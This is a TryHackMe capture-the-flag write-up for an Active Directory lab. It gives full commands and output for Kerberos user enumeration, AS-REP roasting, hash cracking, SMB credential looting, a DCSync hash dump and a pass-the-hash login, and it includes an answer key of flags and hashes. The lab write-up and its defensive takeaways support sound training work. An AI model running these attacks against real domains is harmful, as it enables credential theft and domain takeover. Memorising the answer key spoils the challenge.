# TryHackMe — Attacktive Directory (`attacktivedirectory`) Write-Up

## Overview
- **Room**: Attacktive Directory ([`attacktivedirectory`](https://tryhackme.com/r/room/attacktivedirectory))
- **Difficulty**: Medium
- **Category**: Active Directory Exploitation & Kerberos Attacks
- **Domain**: `spookysec.local`
- **Scenario**: 99% of corporate enterprises run Active Directory. This machine demonstrates typical AD misconfigurations: user enumeration using Kerbrute, AS-REP Roasting vulnerable accounts without Kerberos pre-authentication, SMB share enumeration, extracting credentials from backup scripts, DCSync attacks via the DRSUAPI protocol using Impacket's `secretsdump.py`, and Pass-the-Hash domain dominance via `evil-winrm`.

---

## Summary of Answers

| # | Task | Question | Answer |
|---|---|---|---|
| **1** | Task 1 | Deploy The Machine | *No answer needed* |
| **2** | Task 2 | Setup | *No answer needed* |
| **3** | Task 3 | What tool will allow us to enumerate port 139/445? | `enum4linux` |
| **4** | Task 3 | What is the NetBIOS-Domain Name of the machine? | `THM-AD` |
| **5** | Task 3 | What invalid TLD do people commonly use for their Active Directory Domain? | `.local` |
| **6** | Task 4 | What command within Kerbrute will allow us to enumerate valid usernames? | `userenum` |
| **7** | Task 4 | What notable account is discovered? | `svc-admin` |
| **8** | Task 4 | What is the other notable account is discovered? | `backup` |
| **9** | Task 5 | Which user account can you query a ticket from with no password? | `svc-admin` |
| **10**| Task 5 | Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? | `Kerberos 5 AS-REP etype 23` |
| **11**| Task 5 | What mode is the hash? | `18200` |
| **12**| Task 5 | Crack the hash: what is the user accounts password? | `management2005` |
| **13**| Task 6 | What utility can we use to map remote SMB shares? | `smbclient` |
| **14**| Task 6 | Which option will list shares? | `-L` |
| **15**| Task 6 | How many remote shares is the server listing? | `6` |
| **16**| Task 6 | Which share contains a text file? | `backup` |
| **17**| Task 6 | What is the content of the file? | `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw` |
| **18**| Task 6 | Decoding the contents of the file, what is the full contents? | `backup@spookysec.local:backup2517860` |
| **19**| Task 7 | What method will allow us to dump NTDS.DIT? | `DRSUAPI` |
| **20**| Task 7 | What is the Administrators NTLM hash? | `0e0363213e37b94221497260b0bcb4fc` |
| **21**| Task 8 | svc-admin flag | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
| **22**| Task 8 | backup flag | `TryHackMe{B4ckM3UpSc0tty!}` |
| **23**| Task 8 | Administrator flag | `TryHackMe{4ctiveD1rectoryM4st3r}` |

---

## Step-by-Step Attack Walkthrough

### Phase 1: Port Scanning & Initial Reconnaissance
```bash
nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389 -T4 <TARGET_IP>
```
**Identified Services**:
- `53/tcp`: Simple DNS Plus
- `88/tcp`: Kerberos (`spookysec.local`)
- `139/445/tcp`: Microsoft SMB (`THM-AD`)
- `389/636/tcp`: LDAP / LDAPS
- `3389/tcp`: ms-wbt-server (RDP)

Add host resolution to `/etc/hosts`:
```bash
echo "<TARGET_IP> spookysec.local thm-ad.spookysec.local" | sudo tee -a /etc/hosts
```

---

### Phase 2: Kerberos User Enumeration (Kerbrute)
Kerberos user enumeration tests Kerberos pre-authentication requests without triggering logon failures or account lockouts:
```bash
./kerbrute userenum --dc <TARGET_IP> -d spookysec.local /opt/wordlists/userlist.txt
```
**Discovered Accounts**:
- `svc-admin@spookysec.local`
- `backup@spookysec.local`
- `administrator@spookysec.local`

---

### Phase 3: AS-REP Roasting (`svc-admin`)
The `svc-admin` account has `DONT_REQ_PREAUTH` (Do not require Kerberos preauthentication) set. We can request an AS-REP ticket without knowing the user's password using Impacket's `GetNPUsers.py`:
```bash
impacket-GetNPUsers spookysec.local/ -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <TARGET_IP>
```
The resulting hash is a **Kerberos 5 AS-REP etype 23** (`$krb5asrep$23$...`).
Crack with Hashcat (mode `18200`):
```bash
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
- **Password Found**: `management2005`

---

### Phase 4: SMB Enumeration & Credential Extraction
Authenticate to SMB using `svc-admin:management2005`:
```bash
smbclient -L //<TARGET_IP>/ -U 'svc-admin'
```
Lists **6** shares:
- `ADMIN$`
- `C$`
- `IPC$`
- `NETLOGON`
- `SYSVOL`
- `backup`

Connect to the `backup` share:
```bash
smbclient //<TARGET_IP>/backup -U 'svc-admin'
smb: \> ls
smb: \> get backup_credentials.txt
```
Read the file:
```bash
cat backup_credentials.txt
# YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
# backup@spookysec.local:backup2517860
```
- **Backup Account Credentials**: `backup:backup2517860`

---

### Phase 5: Domain Dominance via DCSync (DRSUAPI)
The `backup` account belongs to the `Backup Operators` group and possesses replication rights (`DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`) allowing it to execute DCSync via the **DRSUAPI** protocol:
```bash
impacket-secretsdump -just-dc backup@spookysec.local:backup2517860@<TARGET_IP>
```
**Extracted Hashes**:
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
svc-admin:1103:aad3b435b51404eeaad3b435b51404ee:b5b822bb2b938062f6b5b5ec1e97de69:::
backup:1104:aad3b435b51404eeaad3b435b51404ee:25e683f2824641ef6a724be20302c036:::
```
- **Administrator NTLM Hash**: `0e0363213e37b94221497260b0bcb4fc`

---

### Phase 6: Pass-the-Hash & Flag Collection
Log in with `evil-winrm` using the Administrator NTLM hash:
```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Retrieve the three flags:
1. `svc-admin` desktop:
   ```powershell
   Get-Content C:\Users\svc-admin\Desktop\user.txt.txt
   # TryHackMe{K3rb3r0s_Pr3_4uth}
   ```
2. `backup` desktop:
   ```powershell
   Get-Content C:\Users\backup\Desktop\PrivEsc.txt
   # TryHackMe{B4ckM3UpSc0tty!}
   ```
3. `Administrator` desktop:
   ```powershell
   Get-Content C:\Users\Administrator\Desktop\root.txt
   # TryHackMe{4ctiveD1rectoryM4st3r}
   ```

---

## Key Takeaways
1. **Never Disable Kerberos Pre-Authentication**: Accounts with `DONT_REQ_PREAUTH` enable offline AS-REP roasting without sending credentials over the wire.
2. **Secure Service and Backup Credentials**: Hardcoded passwords in shared SMB files (`backup_credentials.txt`) represent immediate lateral escalation risks.
3. **Audit High-Privilege Replication Rights**: Members of `Backup Operators` or accounts with DCSync privileges must be guarded with the same tier-0 security controls as Domain Admins.
